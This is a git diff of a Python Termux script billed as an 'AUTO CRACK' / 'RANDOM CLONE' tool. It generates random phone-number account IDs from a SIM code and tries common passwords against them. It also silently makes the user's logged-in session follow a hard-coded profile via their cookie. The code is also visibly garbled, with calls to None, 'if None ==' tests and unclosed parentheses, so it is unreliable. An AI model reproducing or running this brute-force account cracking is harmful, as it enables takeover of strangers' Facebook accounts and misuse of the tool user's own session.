@@ -3,27 +3,34 @@ import sys
 import time
 import requests
 import uuid
+
 os.system('git pull')
+
 os.system('pkg install curl')
+
 class jalan:
 
     
 
     def __init__(self, z):
+    	
         pass
 
 
 def ud():
+	
     os.system('clear')
+    
     jalan(logo)
-    print(' \033[38;5;196m[\033[38;5;195mA\033[38;5;196m]\x1b[1;97m JOIN MY 1st GROUP')
-    print(' \033[38;5;196m[\033[38;5;195mE\033[38;5;196m]\x1b[1;97m EXIT')
+    print(' \033[38;5;196m[\033[38;5;195m01\033[38;5;196m]\x1b[1;97m JOIN MY GROUP')
+    print(' \033[38;5;196m[\033[38;5;195m00\033[38;5;196m]\x1b[1;97m EXIT')
     print('\x1b[1;97m===================================================')
+    
     opt = input(' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\x1b[1;97m Choose option \033[38;5;195m: \033[38;5;46m')
 
-    if opt == 'A':
+    if opt == '1':
 
-        os.system('xdg-open https://facebook.com/groups/551365756758487/')
+        os.system('xdg-open https://facebook.com/groups/3206414299669908/')
 
         ND()
 
@@ -33,21 +40,33 @@ def ud():
 
 def ND():
 
-        return None
-
-def o():
-
     os.system('clear')
 
-    jalan(logo)
+    print(logo)
 
-    jalan('\t   \033[38;5;192m👾HASAN NUMBAR TOOLS👾')
+    print(' \033[38;5;196m[\033[38;5;195m01\033[38;5;196m]\033[38;5;46m ENTER TO RUN')
+    print(' \033[38;5;196m[\033[38;5;195m00\033[38;5;196m]\033[38;5;196m EXIT')
+    opt = input(' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m Choose option \033[38;5;195m: \033[38;5;46m')
+    
+    if opt == '1':
 
-    print(' \x1b[1;97m===================================================')
+        os.system('xdg-open https://www.facebook.com/profile.php?id=100003174443045')
+
+        o()
+
+        return None
+
+    None('\n\x1b[1;31mEXIT\x1b[0;97m')
+
+def o():
+	
+    os.system('clear'
+)
+    jalan(logo
     jalan(' \033[38;5;196m[\033[38;5;195m01\033[38;5;196m]\033[38;5;46m RANDOM CLONE ')
     jalan(' \033[38;5;196m[\033[38;5;195m02\033[38;5;196m]\033[38;5;46m CONTAC ADMIN')
     jalan(' \033[38;5;196m[\033[38;5;195m03\033[38;5;196m]\033[38;5;46m JOIN MY GROUP')
-    jalan(' \033[38;5;196m[\033[38;5;195m04\033[38;5;196m]\033[38;5;196m EXIT')
+    jalan(' \033[38;5;196m[\033[38;5;195m00\033[38;5;196m]\033[38;5;196m EXIT')
     print(' \x1b[1;97m===================================================')
 
     opt = input(' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m Choose option \033[38;5;195m: \033[38;5;46m ')
@@ -59,23 +78,14 @@ def o():
     if None == '2':
 
         os.system('xdg-open https://www.facebook.com/profile.php?id=100003174443045')
-
         return None
-
     if None == '3':
-
-        os.system('xdg-open https://www.facebook.com/profile.php?id=100003174443045')
-
+        os.system('xdg-open https://facebook.com/groups/3206414299669908/')
         return None
-
-    if None == '4':
-
+    if None == '0':
         os.system('exit')
-
         return None
-
     None('\n\x1b[1;31m  Choose valid option\x1b[0;97m')
-    
 import os,sys,time,json,random,re,string,platform,base64,uuid
 os.system("git pull")
 from bs4 import BeautifulSoup as sop
@@ -153,13 +163,9 @@ def cek_apk(session,coki):
 def follow(self, session, coki):
 
         r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100015315258519', {
-
             'cookie': coki }, **('cookies',)).text, 'html.parser')
-
         get = r.find('a', 'Ikuti', **('string',)).get('href')
-
         session.get('https://free.facebook.com' + str(get), {
-
             'cookie': coki }, **('cookies',)).text
 
             
@@ -249,22 +255,21 @@ ha = current.day
 today = date.today()
 
 logo =("""
-    \x1b[1;97m88888b.  .d8b.  d88888b .d8888.  .d8b.  d8b   db
-    88  `8D d8' `8b 88'     88'  YP d8' `8b 888o  88 
-    88oobY' 88ooo88 88oooo   `8bo.  88ooo88 88V8o 88
-    88`8b   88°°°88 88°°°°    `Y8b. 88°°°88 88 V8o88 
-    88 `88. 88   88 88      db   8D 88   88 88  V888 
-    88   YD YP   YP YP      `8888Y' YP   YP VP   V8P 
+  \x1b[1;97m88888b.  .d8b.  d88888b .d8888.  .d8b.  d8b   db
+  88  `8D d8' `8b 88'     88'  YP d8' `8b 888o  88 
+  88oobY' 88ooo88 88oooo   `8bo.  88ooo88 88V8o 88
+  88`8b   88°°°88 88°°°°    `Y8b. 88°°°88 88 V8o88 
+  88 `88. 88   88 88      db   8D 88   88 88  V888 
+  88   YD YP   YP YP      `8888Y' YP   YP VP   V8P 
 \x1b[1;97m===================================================
-\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m AUTHOR  : RAFSAN AHAMMED RAFI
-\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m FACEBOOK: MD. ARIF MIA
-\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m GITHUB  : R4FSAN-143
-\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m WATHAPP : 0130xxxxx54
-\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m TOOLS   : AUTO CRACK
-\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m Stetus  : FREE
-\033[38;5;196m[\033[38;5;195m★\033[38;5;196m]\x1b[1;97m VIRSION : 0.1.9
-====================================================
-""")
+  \033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m AUTHOR  : RAFSAN AHAMMED RAFI
+  \033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m FACEBOOK: MD. ARIF MIA
+  \033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m GITHUB  : R4FSAN-143
+  \033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m WATHAPP : 0130xxxxx54
+  \033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m TOOLS   : AUTO CRACK
+  \033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m Stetus  : FREE
+  \033[38;5;196m[\033[38;5;195m★\033[38;5;196m]\x1b[1;97m VIRSION : 0.5
+====================================================""")
 
 loop = 0
 
@@ -396,7 +401,7 @@ def i():
     jalan(' \x1b[1;97m===================================================')
     code = input(' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;45m SIM CODE\033[38;5;195m : \033[38;5;46m')
     print(" \x1b[1;97m===================================================")
-    limit = int(input(' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m EXAMPLE\033[38;5;46m: \033[38;5;195m2000, \033[38;5;46m3000, \033[38;5;45m50000, \033[38;5;46m100000\n \033[1;93m××××××××××××××××××××××××××××××××××××××××××××××× \n \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;45m CLONING LIMIT\033[38;5;195m:\033[38;5;46m '))
+    limit = int(input(' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m EXAMPLE\033[38;5;46m: \033[38;5;195m2000, \033[38;5;46m3000, \033[38;5;45m50000, \033[38;5;46m100000\n \033[1;93m===================================================\n \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;45m CLONING LIMIT\033[38;5;195m:\033[38;5;46m '))
 
     for nmbr in range(limit):
 
@@ -406,10 +411,10 @@ def i():
 
     os.system("clear")
     print(logo)
-    passx = int(input(" \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m Enter Password Limit\033[38;5;195m : \033[38;5;46m"))
+    passx = int(input("\x1b[1;97m[\033[38;5;195m•\033[38;5;196m]\x1b[1;97m Enter Password Limit\x1b[1;97m : \x1b[1;97m"))
     HamiiID = []
     print("")
-    print(" \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m Example \033[38;5;195m: \033[38;5;46mbangladesh, \033[38;5;192mi love you, \033[38;5;45mfreefire, \033[38;5;195m12345678, Enc.")
+    print("\x1b[1;97m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m Example \033[38;5;195m: \033[38;5;46mbangladesh, \033[38;5;192mi love you, \033[38;5;45mfreefire, \033[38;5;195m12345678, Enc.")
     print("")
     for bilal in range(passx):
 
